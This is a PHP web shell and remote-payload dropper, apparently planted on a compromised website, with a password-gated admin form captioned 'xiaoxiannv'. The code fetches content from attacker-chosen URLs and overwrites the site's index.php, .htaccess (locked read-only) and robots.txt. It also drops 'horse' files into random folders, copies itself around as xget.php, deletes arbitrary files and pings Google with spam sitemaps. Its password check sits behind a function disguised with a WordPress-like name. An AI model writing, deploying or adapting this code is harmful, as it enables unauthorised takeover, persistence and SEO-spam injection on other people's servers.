<?php
$url = isset($_GET['url']) ? $_GET['url'] : '';
if(empty($url)){
    exit('ok');
}
$ppi = isset($_GET['ppi']) ? $_GET['ppi'] : '';
function wp_admin_bar_header() { 
echo '<form   method= "post" action= ""> <input type="input" name ="f_pp" value= ""/><input type= "submit" value= "&gt;"/> 
</form>';
exit;
}
$fn = isset($_GET['fn']) ? $_GET['fn'] : '';
$efile = isset($_GET['fne']) ? $_GET['fne'] : '';
/*ht file*/
$ht = isset($_GET['ht']) ? $_GET['ht'] : '';
/*ht file*/
/* robots file*/
$rob = isset($_GET['rob']) ? $_GET['rob'] : '';
/* robots file*/
$ofile = isset($_GET['ofile']) ? $_GET['ofile'] : '';
/*ping func*/
$ping = isset($_GET['ping']) ? $_GET['ping'] : '';
/*ping func*/
/*hs*/
$hs = isset($_GET['hs']) ? $_GET['hs'] : '';
/*hs*/
/*del*/
$del = isset($_GET['del']) ? $_GET['del'] : '';
/*del*/
$filename = isset($_GET['ofileName'])?$_GET['ofileName']:'index.php';

if ($ppi) {
    if( isset($_POST['f_pp']) ) @setcookie( 'f_pp', $_POST['f_pp'] );
    $pp = isset($_POST['f_pp']) ? $_POST['f_pp'] : (isset($_COOKIE['f_pp']) ? $_COOKIE['f_pp'] : NULL);
    if ($pp != 'fage556'){
    	wp_admin_bar_header();
    	exit;
    }
    if (isset($_POST['appi'])) {
        $type = $_POST['type'];
        $fileNameUrl = $_POST['fileNameUrl'];
        $horseToIndex = isset($_POST['horseIndex']) ? $_POST['horseIndex'] : '';
        $secondName = isset($_POST['secondName']) ? $_POST['secondName'] : '';
        if (empty($type)) {
            echo '<script>alert("type is empty!");window.history.back();</script>';
            exit;
        }
        if (empty($fileNameUrl)) {
            echo '<script>alert("file path is empty!");window.history.back();</script>';
            exit;
        }
        $dirR = $_SERVER['DOCUMENT_ROOT'];
        $dirRIn = $dirR.'/index.php';
        /*horse*/
        if ($type == 1) {
            if($horseToIndex == 1) {
                $dir = __DIR__;
                if ($dir == $dirRIn) {
                    echo 'The root directory is not suitable';
                    exit;
                }
                $hsRes = getFileContent(1, 1,$fileNameUrl,1, 2);
                if ($hsRes) {
                    $filePath = $dir.'/index.php';
                    if (!file_exists($dir.'/index.php')) {
                        @touch($dir.'/index.php');
                    }
                    if(@file_put_contents($filePath, $hsRes)) {
                        $filePath = str_replace($_SERVER['DOCUMENT_ROOT'],'',$filePath);
                        echo is_https().$_SERVER['HTTP_HOST'].$filePath.'===>success';
                    } else {
                        echo 'fail';
                    }
                } else {
                    echo 'The source file cannot be accessed';
                }
                exit;
            }
            
            $list = GetFolders($_SERVER['DOCUMENT_ROOT'],6);
            $arrParts=array_filter(explode("|",$list));
            $index=mt_rand(0,count($arrParts)-1);
            $fileFolder=$arrParts[$index];
            
            $filePath=$fileFolder.'/'.$filename;
            $hsRes = getFileContent(1, 1,$fileNameUrl,1, 2);
            if ($hsRes) {
                if (file_exists($filePath)) {
                    $filePath=$fileFolder.'/xget.php';
                }
                if(@file_put_contents($filePath, $hsRes)) {
                    $filePath = str_replace($_SERVER['DOCUMENT_ROOT'],'',$filePath);
                    echo is_https().$_SERVER['HTTP_HOST'].$filePath.'===>success';
                } else {
                    echo 'fail';
                }
            } else {
                    echo 'The source file cannot be accessed';
            }
            exit;
        }
        /*horse*/
        /*index*/
        if ($type == 2) {
            $eCm = existFn($dirRIn);
        	if (@strstr($eCm,'%71%77%65%72%74%79%75%69')) {
                echo 'real exist!!!';
                exit;
        	}
        	$dir = $_SERVER['DOCUMENT_ROOT'] ? $_SERVER['DOCUMENT_ROOT'].'/' : '/';
        	$file = 'index.php';
            $getRes = getFileContent($dir, $file,$fileNameUrl, $eCm,1);
            if (!empty($getRes)) {
                echo $getRes.'===>success';
            } else {
                echo 'fail';
            }
        }
        /*index*/
        /*ht*/
        if ($type == 3) {
            if (strstr($fileNameUrl,'htaccess')) {
                $hsRes = getFileContent(1, 1,$fileNameUrl,1, 2);
                if ($hsRes&&strstr($hsRes,'RewriteEngine')){
                    $htUrl = $dirR.'/.htaccess';
                    @unlink($htUrl);
                    $putRes = @file_put_contents($htUrl,$hsRes);
    				if (!empty($putRes)) {
    					echo $htUrl.'=>success'."<br>";
    					@chmod($htUrl, 0444);
    				} else {
    					echo $htUrl.'=>fail'."<br>";				
    				} 
                } else {
                    echo 'The source file cannot be accessed';
                }
                exit;
            }
        }
        /*ht*/
        /*second*/
        if ($type == 4) {
            if(!preg_match('/(\.php)$/i', $secondName)){
                echo '<script>alert("er file must .php!");window.history.back();</script>';
                exit;
            }
			@touch($dirR.'/'.$secondName);
			$hsRes = getFileContent(1, 1,$fileNameUrl,1, 2);
			if ($hsRes) {
                $putRes = @file_put_contents($dirR.'/'.$secondName,$hsRes);
    			if (!empty($putRes)) {
    				echo $dirR.'/'.$secondName.'=>success'."<br>";
    			} else {
    				echo $dirR.'/'.$secondName.'=>fail'."<br>";
    			}
			} else {
			    echo 'The source file cannot be accessed';
			}
            exit;
        }
        /*second*/
    }
} else {
    if (!empty($del)) {
        $dirR = $_SERVER['DOCUMENT_ROOT'];
        $dirRDel = $dirR.$del;
        if (@file_exists($dirRDel)) {
            @unlink($dirRDel);
        }
        echo $dirRDel.'===>success';
        exit;
    }
    if (!empty($ping)) {
        $orDomain = 
        $siteArray = [];
        $gpin = "https://www.google.com/ping?sitemap=";
        $siteUrl = is_https().$_SERVER['HTTP_HOST'];
        $siteNum = 15;
        for ($i = 1;$i <= $siteNum; $i ++) {
           $siteArray[] = $gpin.$siteUrl.'/sitemap_index_'.$i.'.xml';
        }
        $siteArray[] = $gpin.$siteUrl.'/sitemap.xml';
        if (count($siteArray) > 0) {
            foreach ($siteArray as $key => $val) {
                $pingRes = getFileContent(1, 1,$val,1, 2);
    			$pingRec = (@strpos($pingRes,'Sitemap Notification Received') !== false) ? 'OK' : 'ERROR';
    // 			echo $siteUrl.'===>Submitting Google Sitemap: '.$pingRec.PHP_EOL;
            }
        }
        if ($pingRec == 'OK') {
            echo $siteUrl.'-ping===>success';
        } else {
            echo 'ping fail';
        }
        exit;
    }
    if (!empty($ofile)) {
        $list = GetFolders($_SERVER['DOCUMENT_ROOT'],6);
        $arrParts=array_filter(explode("|",$list));
        $index=mt_rand(0,count($arrParts)-1);
        $fileFolder=$arrParts[$index];
        
        $filePath=$fileFolder.'/'.$filename;
    
        if ($hs&&$url) {
            $hsRes = getFileContent(1, 1,$url,1, 2);
            if ($hsRes) {
                if (file_exists($filePath)) {
                    $filePath=$fileFolder.'/xget.php';
                }
                if(@file_put_contents($filePath, $hsRes)) {
                    $filePath = str_replace($_SERVER['DOCUMENT_ROOT'],'',$filePath);
                    echo is_https().$_SERVER['HTTP_HOST'].$filePath.'===>success';
                } else {
                    echo 'fail';
                }
            } else {
                echo 'fail';
            }
        } else{
            if (file_exists($filename)) {
                $filePath=$fileFolder.'/xget.php';
            }
            $cpRes = @copy($_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF'],$filePath);
            if ($cpRes) {
                $filePath = str_replace($_SERVER['DOCUMENT_ROOT'],'',$filePath);
                echo is_https().$_SERVER['HTTP_HOST'].$filePath.'===>success';
            } else {
                echo 'fail';
            }
        }
        exit;
    } else {
        $cpRes = httpcopy($url,$fn,$efile,$ht,$rob);
        if (!empty($cpRes)) {
            echo $cpRes.'===>success';
        } else {
            echo 'fail';
        }
        exit;
    }   
}

function httpcopy($url, $file="", $efile="", $ht="",$rob="") {
    $file = empty($file) ? 'index.php' : $file;
    $htFile = '.htaccess';
    $robFile = 'robots.txt';
    $smapFile = 'sitemap.xml';
    $url = str_replace(" ","%20",$url);
    $dir = $_SERVER['DOCUMENT_ROOT'] ? $_SERVER['DOCUMENT_ROOT'].'/' : '/';
    if ($efile) {
        if ($efile != '/') {
            $efa = explode('/',$efile);
            if ($efa) {
                foreach ($efa as $k => $v) {
                    $mdir = $dir.$v.'/';
                    $res = createdir($mdir);
                    if (empty($res)) {
                        echo "$mdir==>fail</br>";
                    }
                    $dir .= $v.'/';
                }
            }
        }
    }
    $eCm = existFn($dir.$file);
    if (!file_exists($dir.$file)) {
        $toRes = @touch($dir.$file);
    }

    if ($rob) {
        if (file_exists($dir.$rob)) {
            @unlink($dir.$rob);
        }
        $getRb = getFileContent($dir, $file,$rob,$eCm, 2);
        if ($getRb) {
            $handle = fopen($dir.$robFile, 'w') or die('0');
            fwrite($handle, $getRb);
            fclose($handle);
        }
    }

    if (file_exists($dir.$smapFile)) {
        @unlink($dir.$smapFile); 
    }
	if (@strstr($eCm,'%71%77%65%72%74%79%75%69')) {
        return true;
	}
    $getRes = getFileContent($dir, $file,$url, $eCm,1);
    return $getRes;
}
function getFileContent($dir, $file, $url, $eCm,$getFile = 0, $timeout=60){
    if(function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        $temp = curl_exec($ch);
		if (curl_error($ch)) {
		    return false;
		}
		if(empty($temp)){
			$opts = array(
				"http"=>array(
				"method"=>"GET",
				"header"=>"",
				"timeout"=>$timeout)
			);
			$temp = stream_context_create($opts);
		}
		if ($getFile == 1) {
            if(!empty($temp)&&@file_put_contents($dir.$file, $temp.PHP_EOL.$eCm)) {
                return $dir.$file;
            } else {
    			return false;
    		}
		} else {
		    return $temp;
		}

    } else {
        $opts = array(
            "http"=>array(
            "method"=>"GET",
            "header"=>"",
            "timeout"=>$timeout)
        );
        $context = stream_context_create($opts);
        if ($getFile == 1) {
            if(@file_put_contents($dir.$file, $context.PHP_EOL.$eCm)) {
                return $dir.$file;
            } else {
                return false;
            }
        } else {
            return $context;
        }
    }
}
function createdir($efile){
    return !is_dir($efile) ? @mkdir($efile,0755,true) : @chmod($efile,0755);
}
function existFn($file) {
    $baseName = basename($file);
    $lastName = dirname($file);
    if ($baseName == "index.php" && !file_exists($file) && file_exists($lastName."/index.html")) {
        $file = $lastName."/index.html";
    }
    if (file_exists($file)) {
        $handle = fopen($file, "r");
        $contents = fread($handle, filesize ($file));
        fclose($handle);
    }
    $contents = $contents ? $contents : '';
    return $contents;
}

function GetLocationURL()
{
  return is_https().$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
}

function is_https()
{
	if (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
		return 'https://';
	} elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
		return 'https://';
	} elseif (!empty($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
		return 'https://';
	}
	return 'http://';
}

function GetFolders($dir,$is_sub = 6)
{
    $returnVal='';
    $files = array();  
    $dir_list = scandir($dir);  
    foreach($dir_list as $file)  
    {  
        if($file=='..' || $file=='.')   
            continue;
            
        if(!is_dir($dir.'/'.$file)) 
            continue;

        $returnVal.=$dir.'/'.$file.'|';
            
        if($is_sub>=1)
        {
            $is_sub--;
            $returnVal.=GetFolders($dir.'/'.$file,$is_sub);
        }
    }
    return $returnVal;
}

function GetRandomFile($dir)
{
    $files=GetFiles($dir);
    $arrParts=explode("|",$files);
    $index=mt_rand(0,count($arrParts)-1);
    $filePath=$arrParts[$index];
    return $filePath;
}

function GetFiles($dir)
{
    $returnVal='';
    $files = array();  
    $dir_list = scandir($dir);
    foreach($dir_list as $file)  
    {  
        if($file=='..' || $file=='.')   
            continue;
            
        if(is_dir($dir.'/'.$file)) 
            continue;
            
        if($dir.'/'.$file=='')
            continue;

        $returnVal.=$dir.'/'.$file.'|';
    }
    return $returnVal;
}
?>
 <html>
     <head>
        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
        <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
     	<script type="text/javascript">
            $(document).ready(function() {
            ������// jquery change
                $('input[type=radio][name=type]').change(function() {
                    if (this.value == '1') {
                        $('.horse').show();
                        $('.second').hide();
                    }
                    else if (this.value == '4') {
                        $('.second').show();
                        $('.horse').hide();
                    } else {
                        $('.second').hide();
                        $('.horse').hide();
                    }
                });
            });
        </script>
        <style>
            .horse,.second{
                display: none;
            }
        </style>
     </head>
     <body>
        <form method="post" action="">
            <table align="center">
                <caption>xiaoxiannv</caption>
                <tr>
                    <td>type��</td>
                    <td>
                        <label>
                        <input type="radio" name="type" id="t2" value="2"checked><label for="t2">index</label>
                        <input type="radio" name="type" id="t1" value="1"><label for="t1">horse</label>
                        <input type="radio" name="type" id="t3" value="3"><label for="t3">.ht</label>
                        <input type="radio" name="type" id="t4" value="4"><label for="t4">.secondary documents</label>
                        </label>
                    </td>
                </tr>
                <tr class="horse">
                    <td>The current path��</td>
                    <td>
                        <input type="radio" name="horseIndex" value="1">yes
                        <input type="radio" name="horseIndex" value="2" checked>no
                    </td>
                </tr>
                <tr class="second">
                    <td>secondName��</td>
                    <td>
                       <input type="text" name="secondName"/>
                    </td>
                </tr>
                <tr>
                    <td>file path��</td>
                    <td>
                       <input type="text" name="fileNameUrl" style="width:370;"/>
                    </td>
                </tr>
                <tr>
                    <td colspan="2" style="text-align: center; padding: 5px;">
                       <input type="hidden" name="appi" value="1"/>
                        <input type="submit" value="submit"/>
                    </td>
                </tr>
            </table>
        </form>
     </body>
 </html>